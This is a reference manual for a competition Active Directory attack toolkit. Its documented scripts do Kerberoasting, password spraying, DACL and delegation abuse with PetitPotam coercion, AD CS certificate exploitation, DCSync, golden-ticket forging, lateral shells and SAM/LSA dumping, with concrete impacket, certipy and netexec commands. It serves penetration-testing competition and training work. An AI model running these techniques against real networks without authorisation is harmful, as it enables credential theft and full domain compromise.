# CPTC AD Scripts — Full Reference

Detailed reference for `lib/common.sh`, the shared conventions, and every script.
For the "which script now?" quick index see **SCRIPTS-OVERVIEW.md**.

---

## 1. Shared library & conventions (`lib/common.sh`)

Every script begins with:

```bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"
parse_common_args "$@"
```

`parse_common_args` strips the **shared flags** and leaves script-specific args in
`COMMON_REMAINING[]`.

### 1.1 Shared flags (all scripts)

| Flag | Meaning |
|------|---------|
| `-t, --target <ip\|cidr\|host>` | Override the `scope.txt` default for this run. |
| `-d, --domain <domain>` | AD domain. Resolution order: this flag > `domain.env` > the selected credential's domain. |
| `--netbios <name>` | NetBIOS/short domain name. Overrides `domain.env` `NETBIOS`. |
| `--dc-ip <ip>` | DC to talk to. Order: this flag > `domain.env` `DC_IP` > `--target`. |
| `--dc-hostname <fqdn>` | DC hostname. Overrides `domain.env` `DC_HOSTNAME`. |
| `-q, --quiet` | Suppress **live screen** output only. The master log still receives everything. |
| `--selftest` | Run the redaction self-check and exit. |
| `--help-common` | Print the shared-flag help. |

Every value sourced from `domain.env` can be overridden per-run with the flag above;
nothing is written back to the file unless you confirm a save when prompted (see §1.2a).

### 1.1a `-h` / `--help` convention (all scripts)

Every script (all thirteen, plus `--help-common` in the library) supports `-h`/`--help`,
printing a condensed quick-reference: a one-line description, each flag with a short
explanation, an example invocation, and a one-line prerequisite note. It's meant to be
read at a glance mid-competition — the same information documented at length here. Run
`./<script>.sh -h` rather than hunting through this file when the clock is running.

### 1.2 `scope.txt` format

Plain text, one target or CIDR per line; `#` begins a comment. The **first**
non-comment, non-blank line is the default target. No validation is performed —
it is a default-with-override, nothing more.

```
# engagement scope
10.0.0.10
# 10.0.0.0/24
```

### 1.2a `domain.env` format + auto-derivation

Separate from `scope.txt` (which holds target IPs/CIDRs only). `domain.env` holds the
**domain context** so it isn't retyped per script. Plain, shell-sourceable `KEY=VALUE`
lines:

```
DOMAIN=support.htb
NETBIOS=SUPPORT
DC_IP=10.129.156.30
DC_HOSTNAME=dc.support.htb
```

- Loaded automatically by `lib/common.sh`; exposes `$DOMAIN`, `$NETBIOS`, `$DC_IP`,
  `$DC_HOSTNAME` to every script.
- **`$BASE_DN` is auto-derived** from `$DOMAIN` — `support.htb` → `DC=support,DC=htb` — so
  it is never stored in the file. (Derived on every run; also refreshed after a credential
  is selected, in case the cred's domain differs.)
- Every value is **overridable per-run** by a flag (`-d`/`--domain`, `--netbios`,
  `--dc-ip`, `--dc-hostname`) without editing the file.
- **Missing value / no file yet** (e.g. early in recon before the domain is known): the
  script that needs it **prompts interactively** for a one-off value and uses it for that
  run only. It is written back to `domain.env` **only** if you answer yes to the
  "save … for future runs?" prompt.
- Resolution order — domain: flag > `domain.env` > selected credential. DC: `--dc-ip` >
  `domain.env` `DC_IP` > `--target`.

### 1.2b Loot directory

Tool artifacts (as opposed to the command log) land in a **per-run loot folder**:

```
~/cptc-loot/<run-id>/
```

- `<run-id>` is timestamp + PID (`YYYYmmdd-HHMMSS-<pid>`), generated once per script
  invocation — so every run's artifacts stay in their own folder and never collide with
  another run's.
- Created lazily by the shared `loot_dir` helper on first use; scripts that write artifacts
  call `announce_loot`, which creates it and logs the resolved path (live + master.log) at
  the start of the run.
- Overridable with `CPTC_LOOT_HOME`.
- Which scripts write here: `kerberoast.sh` (`.hashes`), `asreproast.sh` (`.hashes`),
  `dcsync.sh` (`secretsdump.*`), `adcs_abuse.sh` (`.pfx`/`.ccache`/certipy json),
  `03_enum_creds.sh` BloodHound step (bundle; the netexec fallback's zip is copied in from
  `~/.nxc/logs/`), `recon_advanced.sh` (`autorecon/`), `snaffler_hunt.sh` (`snaffler.tsv`),
  `local_creds.sh` (`local-secretsdump.*`), `bloodhound_query.sh` (`bh-*.json`).

### 1.3 `creds.json` schema

A flat JSON array. Each entry:

```json
{
  "domain":       "CORP",
  "username":     "svc_sql",
  "secret_type":  "password",          // "password" | "ntlm_hash" | "aes_key"
  "secret_value": "Summer2026!",
  "obtained_via": "Kerberoast, 2026-11-07",
  "timestamp":    "2026-11-07 14:03:11"
}
```

Helpers (used by the scripts, usable by hand):

- `creds_get [domain]` — print all creds, optionally filtered by domain.
- `creds_add <domain> <user> <type> <value> <obtained_via>` — append (dedupes exact
  matches) **and** register the value for redaction.
- `creds_select [domain]` — pick the first usable cred (prefers `password`, then
  `ntlm_hash`, then `aes_key`); sets `SEL_DOMAIN/SEL_USER/SEL_STYPE/SEL_SECRET`.
- `require_creds [domain]` — `creds_select` or exit with a pointer to the roast/enum
  scripts.

Credentials are initialised to `[]` automatically if the file is missing.

### 1.4 `master.log` format

Fixed path `~/cptc-logs/master.log` (override with `CPTC_LOG_HOME`). **Every** script
appends here regardless of `-q`. One block per run:

```
================================================================
[2026-11-07 14:02:55] BEGIN kerberoast.sh   args: -t 10.0.0.10 -d CORP
    target=10.0.0.10  domain=CORP  dc=10.0.0.10  quiet=0
    run_dir=/root/cptc-logs/runs/kerberoast-20261107-140255
----------------------------------------------------------------
  $ impacket-GetUserSPNs -request -dc-ip 10.0.0.10 ... CORP/jdoe:[REDACTED]@10.0.0.10
  --- output: 12 line(s); full copy: .../cmd-001.out ---
  <...redacted, trimmed command output...>
  EXIT: 0
  [+] cred stored: CORP/svc_sql (password) via Kerberoast, 2026-11-07
----------------------------------------------------------------
[2026-11-07 14:03:30] END   kerberoast.sh   status: success
================================================================
```

Key properties:

- **Redaction is applied to every line**, both the command string and its captured
  output (not just structured fields). The single choke point is `master_raw()`.
- Output is **trimmed** to `CPTC_MAX_LOG_LINES` (default 200). The **full, untrimmed**
  output of each command is saved to `~/cptc-logs/runs/<script>-<ts>/cmd-NNN.out` and
  referenced by path — so a huge BloodHound/secretsdump dump is summarised by line
  count in the master log, not inlined.
- `status:` is `success`, `partial`, `failure`, or `quit-by-user`.

The master log is meant to be handed to an LLM afterward to reconstruct everything that
happened, so formatting is consistent and complete.

### 1.5 Redaction (the security-critical part)

`lib/common.sh` keeps an in-memory list (`SECRETS`) of every credential value seen this
run: everything loaded from `creds.json` at startup, plus anything added mid-run via
`creds_add` / `secret_track`. Before any text reaches the log, `redact()` replaces each
known secret with `[REDACTED]`.

- **Exact string matching**, not regex: bash literal substring replacement
  (`${text//"$secret"/[REDACTED]}`). It cannot be fooled by special characters and
  cannot miss a value it has been told about. A regex that merely "looks like" a hash
  would both miss real secrets and clobber innocent text.
- **Longest-first**: if one secret is a substring of another, the longer is removed
  first so no fragment survives.
- **Ordering for freshly-dumped secrets:** secret-producing scripts (dcsync, adcs,
  shadow-cred, roast-crack) capture output, `creds_add`/`secret_track` the new values,
  and *only then* write the output to the log — so even a hash's first appearance is
  redacted. CLI-supplied secrets (`dacl_abuse -w`, `delegation_abuse --computer-pass`)
  are tracked before the run header is written.
- **Verify it:** `bash lib/common.sh --selftest` confirms a known test secret is removed
  from a sample log line (prints `REDACTION SELFTEST: PASS`).

> Live terminal output (default, no `-q`) is **unredacted** on purpose — you need to read
> real credentials to use them. Only the master log is redacted.

### 1.6 Pause / confirm behaviour

- **Composite** scripts (`02_enum_nocreds.sh`, `03_enum_creds.sh`, `hostprivesc.sh`) call
  `pause_step` before each sub-step: `y`/Enter = run, `n` = skip, `q` = quit the script.
- **Atomic** scripts never pause between steps — invoking them is the confirmation.
  Some offer a single `confirm` prompt for an optional action (e.g. "crack now?");
  suppress/force those with `--no-crack` / `--crack`.
- `-q` affects live echo only; pause/confirm prompts still appear (they read from
  `/dev/tty`).

### 1.7 Shared state files

- `~/cptc-logs/state/<target>.ports` — open ports recorded by `01_recon.sh`;
  `02_enum_nocreds.sh` gates SNMP on port 161, `lateral_shell.sh` auto-picks WinRM on 5985.
- `~/cptc-logs/state/<domain>.sid` — domain SID recorded by `dcsync.sh`; consumed by
  `goldenticket.sh`.

### 1.8 Environment overrides (handy for testing)

`CPTC_SCOPE`, `CPTC_CREDS`, `CPTC_DOMAIN_ENV`, `CPTC_LOG_HOME`, `CPTC_LOOT_HOME`,
`CPTC_MAX_LOG_LINES`, plus tool-path vars `KRBRELAYX`, `PETITPOTAM`, `PAYLOADS`.

---

## 2. Recon & enumeration

### `01_recon.sh` — host discovery + nmap sweep *(atomic)*

- **Prereqs:** a target (scope.txt or `-t`). `nmap`.
- **Runs:** `nmap -sn` ping sweep, then `nmap -Pn -n -p- --min-rate 2000 -sV -sC -oA`.
- **Flags:** shared only.
- **Writes:** `run_dir/nmap.*`, `run_dir/open-ports.txt`; appends ports to
  `state/<target>.ports`; master.log entry.
- **Success looks like:** `[+] open ports on 10.0.0.10: 53 88 135 139 389 445 ...`.
- **Failure modes:** empty port list → check `run_dir/nmap.nmap`; host filtered → try
  `-t` with a single host, confirm routing/VPN.

### `recon_advanced.sh` — deep AutoRecon follow-up *(atomic)*

- **Prereqs:** a target (scope.txt or `-t`); `autorecon`. Separate from `01_recon.sh` (the
  fast sweep) — this is the slower, thorough automated pass.
- **Runs:** `autorecon -o <loot>/autorecon <target>` (AutoRecon does its own port scan then
  fans out per-service enumeration plugins).
- **Flags:** shared only.
- **Writes:** AutoRecon's full tree under `<loot>/autorecon/`; master.log entry. No creds.
- **Success looks like:** `[+] AutoRecon finished → results under <loot>/autorecon`.
- **Failure modes:** non-zero exit → partial results may still be present; very slow →
  expected for a full AutoRecon run; needs root for some scan types.

### `02_enum_nocreds.sh` — unauthenticated enum *(composite)*

- **Prereqs:** target. For the LDAP harvest/kerbrute/DNS steps a domain (`domain.env` or
  `-d`). Tools: `ldapsearch`, `netexec`, `smbclient`, `rpcclient`, `onesixtyone`,
  `snmp-check`, `kerbrute`, `dig`.
- **Sub-steps (each pauses):** **anonymous LDAP attribute harvest** (`ldapsearch -x`, no
  `-D`, pulling `sAMAccountName`/`description`/`info`/`comment`/`userPrincipalName` under
  `$BASE_DN`, with password-shaped values flagged — see below) → SMB null/guest + shares →
  RPC null session → SNMP *(only if 161 recorded open)* → kerbrute userenum → DNS AXFR + SRV.
- **Password flagging:** after the LDAP pull, `flag_ldap_secrets` scans the
  `description`/`info`/`comment`/`userPassword`-type values and **highlights** (to screen
  and master.log, prefixed `[!! possible secret]`) any that either (a) contain
  `pwd:`/`pass:`/`password`, or (b) are ≥8 chars and mix upper + lower + a digit. This is a
  highlight, **not** a filter — the full raw dump is still shown/logged. A flagged value is
  not auto-stored; add it with `add_cred.sh` if real (then it's redacted from then on).
- **Flags:** `-U/--userlist <file>` (default seclists shortlist), plus shared.
- **Writes:** `run_dir/kerbrute.out` (valid users); master.log entries. Does **not** write
  creds.
- **Success looks like:** flagged LDAP secrets, share lists, `enumdomusers` output, kerbrute
  `[+] VALID USERNAME`.
- **Failure modes:** LDAP harvest empty → anonymous bind disabled (normal) — revisit in `03`
  once you have a cred; SNMP skipped → 161 not in state (run recon first or `-t`);
  kerbrute/DNS skipped → set a domain; AXFR refused → normal, move on.

### `03_enum_creds.sh` — authenticated enum *(composite)*

- **Prereqs:** a usable credential in `creds.json`; target = DC. Tools: `netexec`,
  `ldapdomaindump`, `bloodhound-python`, `ldapsearch`, `bloodyad`, `rpcclient`.
- **Sub-steps (each pauses):** netexec LDAP users/groups/password-policy + SMB shares →
  ldapdomaindump (password creds only) → **BloodHound collection, two-method fallback**
  (see below) → RID-brute → GPP/SYSVOL cpassword → **authenticated LDAP attribute harvest**
  (`ldapsearch -x` *simple bind* with `-D user@domain -w <pass>` and filter
  `(&(objectCategory=person)(objectClass=user))` for a password cred, else
  `netexec ldap --users` for a hash; same password-flagging as `02`, see that entry) →
  **bloodyad read pass** (`get search` over user objects for
  `sAMAccountName,description,memberOf`, `get object <BASE_DN>`, `get writable`) →
  **authenticated rpcclient** (`enumdomusers;enumdomgroups;querydominfo;lsaquery;enumprivs`,
  using `DOMAIN/user%secret`, adding `--pw-nt-hash` for a hash). rpcclient is fast, so it's
  a normal unconditional sub-step (not flag-gated).
- **BloodHound fallback:** primary is `bloodhound-python -c All --zip` (bundle lands in the
  run dir). If it exits non-zero **or** produces no `.zip`/`*bloodhound*.json`, it falls
  back automatically to `netexec ldap <auth> --bloodhound -c All --dns-server <DC>` (output
  under `~/.nxc/logs/`). The step logs which tool actually ran **and the output path** (to
  screen and master.log) — so to tell which collector produced your data, look for the
  `[+] BloodHound data collected by ...` line and the path it names.
- **LDAP bind note:** the authenticated harvest uses a **simple bind** (`-x`), never
  GSSAPI/SASL — so it needs no pre-existing Kerberos ticket and won't fail with
  "Unknown authentication method / no mechanism available". (The `02` anonymous harvest is
  likewise `-x` and unaffected.)
- **Flags:** shared (`-d` to set domain if the cred's domain is wrong).
- **Writes:** `run_dir/ldd/` (HTML/JSON); BloodHound bundle in `run_dir` (bloodhound-python)
  or `~/.nxc/logs/` (netexec); master.log (flagged secrets highlighted, winning collector +
  path noted). Does not auto-write creds — add flagged finds with `add_cred.sh`.
- **Success looks like:** user/group tables, a BloodHound zip to import into BloodHound CE,
  a `[+] BloodHound data collected by ...` line, any `[!! possible secret]` highlights,
  bloodyad writable-object list.
- **Failure modes:** "no usable credential" → get one first; ldapdomaindump / authenticated
  ldapsearch skipped → you're authing with a hash (no PtH there; `netexec --users` covers
  it); both BloodHound methods failed → check `-ns`/DC reachability, DNS, and clock skew;
  rpcclient access denied → the cred lacks rights for that RPC call (the others still
  return).

### `bloodhound_query.sh` — predefined Cypher queries *(atomic, read-only)*

- **Prereqs:** BloodHound CE running with data imported (via `03_enum_creds.sh`); `curl` +
  `jq`; the CE API password. Read-only — no collection, no exploitation, no side effects, so
  no pausing despite running several queries.
- **Runs:** logs in to `POST /api/v2/login`, then `POST /api/v2/graphs/cypher` per selected
  query. Predefined keys: `da_paths` (shortest paths to Domain Admins), `kerberoastable`,
  `asreproastable`, `unconstrained` (delegation), `dcsync` (DCSync-capable principals).
- **Flags:** `--bh-url` (default `http://localhost:8080`), `--bh-user` (default `admin`),
  `--bh-pass` (or `BH_PASS` env; prompted if neither), `--queries a,b,c` (subset; default
  all).
- **Writes:** one `<loot>/bh-<key>.json` per query; master.log notes node counts + output
  paths. The login password and session token are tracked → redacted in master.log; the
  login body is written to a temp file (never echoed) and deleted.
- **Examples:**
  ```bash
  ./bloodhound_query.sh --bh-pass 'Adm1nPass'
  ./bloodhound_query.sh --queries kerberoastable,dcsync
  ```
- **Success looks like:** `[+] kerberoastable: 7 node(s) → <loot>/bh-kerberoastable.json`.
- **Failure modes:** login fails → check `--bh-url`/`--bh-user`/`--bh-pass` and that CE is up
  (the CE admin password is set on first boot — check the container logs); a query returns 0
  → no matching data collected yet, or the property/edge name differs on your CE version
  (the raw JSON is saved for inspection).

---

## 3. AD exploitation (atomic)

### `kerberoast.sh`

- **Prereqs:** any valid domain credential; DC reachable. `impacket-GetUserSPNs`, `hashcat`.
- **Runs:** `impacket-GetUserSPNs -request ... -outputfile`, then optional
  `hashcat -m 13100`.
- **Flags:** `-w/--wordlist` (default rockyou), `--crack` (force), `--no-crack` (skip prompt).
- **Writes:** `<loot>/kerberoast.hashes`; each cracked password →
  `creds.json` (`password`, `obtained_via="Kerberoast, <date>"`); master.log.
- **Success looks like:** `[+] saved N hash(es)`, then `[+] recovered N Kerberoast password(s)`.
- **Failure modes:** no hashes → no SPN accounts / bad creds / clock skew; hashcat "No hashes
  loaded" → wrong `-m`/empty file; nothing cracked → wordlist exhausted.

### `asreproast.sh`

- **Prereqs:** either a credential (authenticated request) **or** `-d <domain>` + a userlist
  (credential-less). `impacket-GetNPUsers`, `hashcat`.
- **Runs:** `impacket-GetNPUsers -request -format hashcat ...` (with or without creds), then
  optional `hashcat -m 18200`.
- **Flags:** `-U/--userlist`, `-w/--wordlist`, `--crack`, `--no-crack`.
- **Writes:** `<loot>/asrep.hashes`; cracked passwords → `creds.json`
  (`obtained_via="AS-REP roast, <date>"`); master.log.
- **Failure modes:** no hashes → no preauth-disabled accounts; credential-less run needs
  real usernames (feed it kerbrute output).

### `spray.sh` — password spray with lockout gate *(atomic)*

- **Prereqs:** a username list (`-U`, e.g. `02`'s kerbrute output); one or a few candidate
  passwords; DC reachable; `netexec`.
- **⚠ Lockout safety (mandatory, runs before any spray):** queries the domain lockout policy
  (`netexec --pass-pol`, anonymous then falling back to a stored cred) and computes
  **passwords-tried-per-account** = the number of candidate passwords. The danger is several
  passwords against the *same* account inside the observation window — **not** one password
  across many accounts. If that count would **reach or exceed** the lockout threshold, the
  script **refuses and prints the actual threshold/window**. Pass **`--i-know-the-risk`** to
  override *only* when you've verified the policy is safe (generous/disabled). If the policy
  can't be read, a single password is still allowed (always 1/account); more than one is
  refused without the override.
- **Runs:** per password, `netexec smb <dc> -u <userlist> -p <pw> --continue-on-success`;
  aborts immediately if it sees `STATUS_ACCOUNT_LOCKED_OUT`.
- **Flags:** `-U/--userlist <file>` (required), `-p/--password <pw>` (repeatable),
  `-P/--passwords <file>`, `--i-know-the-risk`.
- **Writes:** recovered creds → `creds.json` (`password`, `obtained_via="password spray,
  <date>"`); master.log (candidate passwords tracked → redacted).
- **Examples:**
  ```bash
  ./spray.sh -U users.txt -p 'Autumn2026!'            # one password, many users — safe
  ./spray.sh -U users.txt -P pws.txt --i-know-the-risk # several passwords — only if safe
  ```
- **Success looks like:** `[+] spray recovered N credential(s) → creds.json`.
- **Failure modes:** refusal → threshold would be hit (read the printed policy; reduce
  passwords or verify + override); no hits → wrong passwords/users; lockouts seen → the run
  stops itself (back off, check the policy).

### `dacl_abuse.sh`

- **Prereqs:** a credential whose ACL rights match the chosen technique (confirm in
  BloodHound). `bloodyad`; `certipy` for ShadowCred. Target = DC.
- **Technique (`-T`):**
  - `ForceChangePassword -o <victim> [-w <newpass>]` → resets victim; new password →
    `creds.json`.
  - `AddMember -g <group> [-a <principal=you>]` → adds principal to group.
  - `ShadowCred -o <victim>` → certipy shadow auto → victim's NT hash → `creds.json`.
  - `DCSync -a <principal>` → grants replication rights (then run `dcsync.sh` as that
    principal).
- **Writes:** creds for ForceChangePassword/ShadowCred; master.log for all.
- **Examples:**
  ```bash
  ./dacl_abuse.sh -T ForceChangePassword -o helpdesk -w 'NewP@ss1!'
  ./dacl_abuse.sh -T AddMember -g 'Domain Admins' -a jdoe
  ./dacl_abuse.sh -T ShadowCred -o DC01$
  ./dacl_abuse.sh -T DCSync -a jdoe
  ```
- **Failure modes:** "failed" → you don't actually hold the right over the object; ShadowCred
  needs a healthy AD CS / key-trust; the new password must meet complexity/length policy.

### `delegation_abuse.sh`

- **Prereqs (`-m rbcd`):** a credential that can create a computer (MAQ > 0) or write the
  victim's RBCD attribute. `impacket-addcomputer`, `impacket-rbcd`, `impacket-getST`.
- **Prereqs (`-m unconstrained`):** you control a host/account WITH unconstrained delegation;
  its NTLM/AES in `creds.json`; `~/tools/krbrelayx` and `~/tools/PetitPotam`; `--attacker-ip`.
- **Flags:** rbcd — `--computer`, `--computer-pass`, `--delegate-to VICTIM$`, `--impersonate`,
  `--spn`. unconstrained — `--attacker-ip`, `--coerce-target`, `--method petitpotam|printerbug`.
- **Writes:** rbcd — machine-account password → `creds.json`, service ticket `.ccache` in
  `run_dir`. unconstrained — captured `.ccache` in `run_dir`, krbrelayx log. master.log for both.
- **Examples:**
  ```bash
  ./delegation_abuse.sh -m rbcd --delegate-to WS01$ --impersonate Administrator
  ./delegation_abuse.sh -m unconstrained --attacker-ip 10.10.14.7 --method petitpotam
  ```
- **Use the ticket:** `export KRB5CCNAME=<run_dir>/<user>@<host>.ccache` then an impacket exec
  tool with `-k -no-pass`.
- **Failure modes:** addcomputer fails → MAQ is 0 (edit RBCD directly instead); getST SPN must
  match a real service on the victim; unconstrained capture needs correct DNS + the delegation
  account's key, and often the attacker host registered in DNS.

### `adcs_abuse.sh`

- **Prereqs:** a credential; AD CS present. `certipy`.
- **Dynamic ESC detection (not hardcoded to ESC1):** runs `certipy find -vulnerable` first,
  then parses which ESC class(es) actually apply and attempts **each in turn** — it is not
  assumed to be ESC1. Template↔ESC pairs are detected from the find output (CA auto-read
  too). Still atomic / no pauses: "one script, one job — find and exploit whatever AD CS
  misconfiguration exists."
- **Per-class handling:** request-based classes (ESC1/2/3/6/9/10/13/16) are exploited via
  `certipy req -ca -template -upn <administrator>` then `certipy auth -pfx` to recover a TGT
  + NT hash. Relay-based classes (ESC8/ESC11) are **reported, not auto-run** (they need
  coercion + a relay — the entry prints the `certipy relay` command and points at
  `delegation_abuse.sh`/PetitPotam).
- **Flags:** `--find-only` (enumerate only); `--esc <N>` to force a specific class
  (bypass detection, requires `--ca` + `--template`); `--ca`/`--template` manual override;
  `--upn` (default `administrator@<domain>`).
- **Writes:** `.pfx` / TGT `.ccache` / certipy json in the **loot dir**; each recovered NT
  hash → `creds.json` (`obtained_via="AD CS ESC<N> (<template>), <date>"`); master.log.
- **Workflow:** just run it — it detects and exploits. Use `--find-only` to inspect first,
  or `--esc/--ca/--template` when you already know which template to hit.
- **Success looks like:** `[+] ESC<N>: recovered NT hash for <acct>` per exploited class.
- **Failure modes:** "no vulnerable ESC templates detected" → nothing found (try
  `--find-only`, or force with `--esc/--ca/--template`); a class produces no `.pfx` → that
  class needs manual certipy flags (force it and add them); `auth` fails → UPN not permitted
  by the template, or DC clock skew; ESC8/11 found → not auto-run, follow the printed relay
  guidance.

### `dcsync.sh`

- **Prereqs:** replication rights — Domain Admin, or a principal granted DCSync (see
  `dacl_abuse.sh -T DCSync`). `impacket-secretsdump`, `impacket-lookupsid`.
- **Modes (`-m`):** `full` (`-just-dc`) or `single --account <name>` (default `krbtgt`).
- **Writes:** every NT hash → `creds.json` (krbtgt tagged
  `obtained_via="DCSync krbtgt (for goldenticket.sh)"`); secretsdump `-outputfile` artifacts
  (`secretsdump.*`) in the **loot dir**; domain SID → `state/<domain>.sid`; master.log
  (hashes redacted — parsed & tracked before logging).
- **Examples:**
  ```bash
  ./dcsync.sh -m single --account krbtgt      # just what goldenticket needs
  ./dcsync.sh -m full                          # whole domain
  ```
- **Success looks like:** `[+] stored N NT hash(es)` and, for krbtgt,
  `[+] krbtgt + domain SID ready → goldenticket.sh can forge...`.
- **Failure modes:** `rpc_s_access_denied` → no replication rights; no SID recorded → pass
  `--sid` to goldenticket or re-run so `lookupsid` succeeds.

### `goldenticket.sh`

- **Prereqs:** krbtgt NT hash in `creds.json` (from `dcsync.sh`) and the domain SID
  (`state/<domain>.sid` or `--sid`); `-d <domain>`. `impacket-ticketer`.
- **Runs:** `impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain <domain> <user>`.
- **Flags:** `--user` (default `Administrator`), `--sid` (override).
- **Writes:** `run_dir/<user>.ccache`; master.log (krbtgt hash redacted).
- **Use it:** `export KRB5CCNAME=<run_dir>/<user>.ccache` then an impacket tool with
  `-k -no-pass`.
- **Failure modes:** "no krbtgt NT hash" → run `dcsync.sh` first; "no domain SID" → `--sid` or
  re-run dcsync; ticket rejected → SID/domain mismatch or krbtgt rotated twice.

### `lateral_shell.sh`

- **Prereqs:** a usable credential; target = the host to land on. `evil-winrm`,
  `impacket-psexec`, `impacket-wmiexec`.
- **Method (`-m`):** `auto` (WinRM if 5985 recorded open, else psexec), `winrm`, `psexec`,
  `wmiexec`.
- **Writes:** master.log records the (redacted) command and exit; the session itself is
  interactive and not captured.
- **Examples:**
  ```bash
  ./lateral_shell.sh -t 10.0.0.25 -m winrm
  ./lateral_shell.sh -t 10.0.0.25            # auto
  ```
- **Failure modes:** WinRM denied → user not in Remote Management Users (try psexec/wmiexec);
  psexec needs admin + writable share + service create rights (noisy); hash auth needs
  `ntlm_hash` in creds.

### `cred_spray_internal.sh` — credential-reuse scouting *(atomic)*

- **Prereqs:** at least one credential in `creds.json`; target host(s) (`-t`, `--hosts
  <file>`, or scope.txt); `netexec`.
- **Modes:** default = ONE credential (chosen by `-u`/`-d`, else the first usable one).
  `--all-creds` = iterate EVERY credential in `creds.json` against the host(s) — the opt-in
  broad sweep.
- **⚠ Lockout safety (`--all-creds` only):** same reasoning as `spray.sh`. It computes the
  **max distinct secrets tried against any single account** (grouping creds by
  domain\\username) and, if that would **reach the lockout threshold**, **refuses** and
  prints the policy. Override with **`--i-know-the-risk`**. Single-cred mode is one attempt
  per account — always safe, no gate. Aborts on `STATUS_ACCOUNT_LOCKED_OUT`.
- **Runs:** per credential, `netexec smb <hosts> -u <user> {-p|-H} <secret>
  --continue-on-success`.
- **Flags:** `-u/--username` (+ `-d` for single-cred selection), `--all-creds`, `--hosts
  <file>`, `--i-know-the-risk`.
- **Writes:** no new creds (it tests existing ones); master.log + a final summary of which
  identity validated on which host (admin/`Pwn3d!` flagged). **Live summary lines reference a
  credential by identity (domain/user), never the secret**; master.log redaction applies
  throughout.
- **Examples:**
  ```bash
  ./cred_spray_internal.sh -u jdoe -d corp.local --hosts hosts.txt
  ./cred_spray_internal.sh --all-creds -t 10.0.0.0/24        # gated broad sweep
  ```
- **Success looks like:** `[+] reuse: corp.local/jdoe @ 10.0.0.25 (admin/Pwn3d!)`.
- **Failure modes:** refusal → `--all-creds` would hit the lockout threshold (reduce scope or
  verify + override); nothing validated → the creds aren't reused on those hosts.

---

## 4. Host-level Windows privesc

### `hostprivesc.sh` — WinPEAS triage *(composite)*

- **Prereqs:** a WinPEAS output file (`-f`). Staged payloads under
  `~/tools/windows-payloads/` for the actual on-target step.
- **Runs:** reads the file, and for each ranked technique reports whether WinPEAS flagged the
  indicator, pauses, and names the staged tool/misconfig to use. Ranked:
  SeImpersonate/Potato → service misconfig → unquoted service path → AlwaysInstallElevated →
  stored creds/registry → missing patches. Stops at the first technique you confirm worked
  unless `--all`.
- **Flags:** `-f/--file <winpeas.txt>` (required), `--all` (walk all six).
- **Writes:** master.log triage summary. (It does not execute on the target; it guides you.)
- **Example:**
  ```bash
  ./hostprivesc.sh -f loot/ws01-winpeas.txt
  ./hostprivesc.sh -f loot/ws01-winpeas.txt --all
  ```
- **Failure modes:** no file → run the staged WinPEAS on the target, save output, re-run with
  `-f`; an indicator shows "no" but you have other signal → you can still choose `y` to pursue it.

---

## 4b. Post-foothold looting

### `snaffler_hunt.sh` — hunt shares/filesystems for secrets *(atomic)*

- **Prereqs:** `Snaffler.exe` staged (the setup script puts it at `~/tools/snaffler/`; or
  `--exe`); `mono` on Kali to run it; for `--share`, a password credential in `creds.json`
  plus root (cifs mount). Snaffler is a Windows .NET tool.
- **Runs:** `mono Snaffler.exe -s -o <loot>/snaffler.tsv` with `-i <path>` (a `--path` dir or
  a mounted `--share`), or `-n <computer>` for AD share discovery (`--computer`, best-effort
  on Kali). With `--share` it cifs-mounts read-only, snaffles, and unmounts.
- **Flags:** `--path <dir>`, `--share //host/share`, `--computer <host>`, `--exe <path>`.
- **Writes:** `<loot>/snaffler.tsv`; master.log. No auto-creds — review the TSV and add real
  finds with `add_cred.sh`.
- **Examples:**
  ```bash
  ./snaffler_hunt.sh --path /mnt/share-c
  ./snaffler_hunt.sh --share //10.0.0.5/C$      # mounts (needs a cred + root)
  ```
- **Success looks like:** `[+] Snaffler findings written → <loot>/snaffler.tsv (N line(s))`.
- **Failure modes:** no `mono` → it prints the on-target `Snaffler.exe` command to run on a
  Windows foothold instead (then copy the TSV back into the loot dir); `--share` mount fails →
  needs root + `cifs-utils` + a valid password cred (or mount manually and use `--path`).

### `local_creds.sh` — local SAM/LSA dump + file sweep *(composite)*

- **Prereqs:** a credential in `creds.json` with admin on the target **host** (`-t`, not the
  DC); `impacket-secretsdump`, `netexec`.
- **Sub-steps (pauses between):** (1) `impacket-secretsdump` against the host dumps local
  SAM/LSA/cached secrets → each local NT hash is added to `creds.json` (domain field = the
  host, `obtained_via="local SAM dump (<host>)"`); (2) `netexec --spider` of the host's shares
  for `unattend.xml` / `Autounattend.xml` / `sysprep.*` / `web.config` / `.config` / `.ps1` /
  key files — hits are listed for you to pull and inspect (config/unattend passwords are added
  manually with `add_cred.sh -o 'config file find'`).
- **Flags:** shared (`-t <host>` required).
- **Writes:** `<loot>/local-secretsdump.*`; local NT hashes → `creds.json`; master.log
  (dumped hashes parsed+tracked before logging, so redacted).
- **Example:** `./local_creds.sh -t 10.0.0.25`
- **Success looks like:** `[+] stored N local NT hash(es) from 10.0.0.25`, then a list of
  spidered credential-file hits.
- **Failure modes:** secretsdump access denied → the cred isn't local-admin on that host;
  spider empty → no matching files in the searched shares (try a manual shell sweep).

---

## 4a. Credential management

### `add_cred.sh` — manually add a credential *(atomic)*

- **Prereqs:** none (`creds.json` is created if absent); `jq`.
- **Purpose:** record a credential obtained **outside** the toolkit (teammate, phishing,
  found elsewhere) so every other script can use it. Writes through the same `creds_add`
  helper as the rest of the toolkit — identical schema, dedupe, and redaction tracking.
- **Flags** (any omitted value is prompted for interactively):
  - `-d, --domain <domain>` — domain for the cred (else `domain.env`, else prompt).
  - `-u, --username <user>` — account name.
  - `-s, --secret-type <type>` — one of `password` | `ntlm_hash` | `aes_key` (validated;
    matches the `creds.json` schema).
  - `-x, --secret-value <value>` — the password / NT hash / AES key.
  - `-o, --obtained-via <note>` — provenance note (default `"manually added"`).
- **Writes to `creds.json`:** one entry `{domain, username, secret_type, secret_value,
  obtained_via, timestamp}` (skipped if an exact duplicate already exists). The value is
  tracked for redaction, so it is `[REDACTED]` in `master.log` from the moment it is added —
  including the run header.
- **Examples:**
  ```bash
  ./add_cred.sh -d support.htb -u ldap -s password -x 'Railway1!' -o 'LDAP info field'
  ./add_cred.sh                      # fully interactive
  ```
- **Failure modes:** invalid `--secret-type` → it re-prompts / errors with the allowed set;
  empty domain/username/secret → refuses with a clear message.

---

## 5. Quick end-to-end example

```bash
# 1. recon
./01_recon.sh -t 10.0.0.10
# 2. unauth enum (collect usernames) — composite, step through
